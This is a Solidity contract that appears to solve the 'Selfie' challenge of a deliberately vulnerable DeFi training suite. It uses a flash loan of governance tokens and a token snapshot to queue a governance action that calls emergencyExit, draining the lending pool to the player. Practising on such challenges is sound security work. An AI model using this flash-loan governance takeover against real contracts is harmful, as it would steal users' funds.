// SPDX-License-Identifier: MIT

import "../selfie/SelfiePool.sol";
import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "../selfie/SimpleGovernance.sol";
import "../DamnValuableTokenSnapshot.sol";

pragma solidity ^0.8.0;

error JustChecking();
error ActionDoesntExist();
error ProposedAtIs0();

contract AttackSelfie {
    SelfiePool immutable i_selfiePool;
    SimpleGovernance immutable i_governance;
    DamnValuableTokenSnapshot immutable i_governanceSnapshot;
    IERC20 immutable token;
    uint256 actionId = 0;
    address immutable i_player;

    constructor(
        address _selfiePool,
        address _governance,
        address _token,
        address _player
    ) {
        i_selfiePool = SelfiePool(_selfiePool);
        i_governance = SimpleGovernance(_governance);
        i_governanceSnapshot = DamnValuableTokenSnapshot(_token);
        token = IERC20(_token);
        i_player = _player;
    }

    function attack(address _attacker, uint256 _amount) public {
        uint256 amount = _amount;
        IERC3156FlashBorrower attackAttacker = IERC3156FlashBorrower(_attacker);

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            _attacker
        );

        i_selfiePool.flashLoan(attackAttacker, address(token), amount, data);
    }

    function onFlashLoan(
        address,
        address,
        uint256 _amount,
        uint256,
        bytes calldata
    ) public returns (bytes32) {
        // revert JustChecking();
        token.approve(address(msg.sender), _amount);

        uint128 amount = 0;

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            i_player
        );

        i_governanceSnapshot.snapshot();

        actionId = i_governance.getActionCounter();
        i_governance.queueAction(address(i_selfiePool), amount, data);
        i_governanceSnapshot.snapshot();

        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }

    function getActionId() public view returns (uint256) {
        return actionId;
    }
}
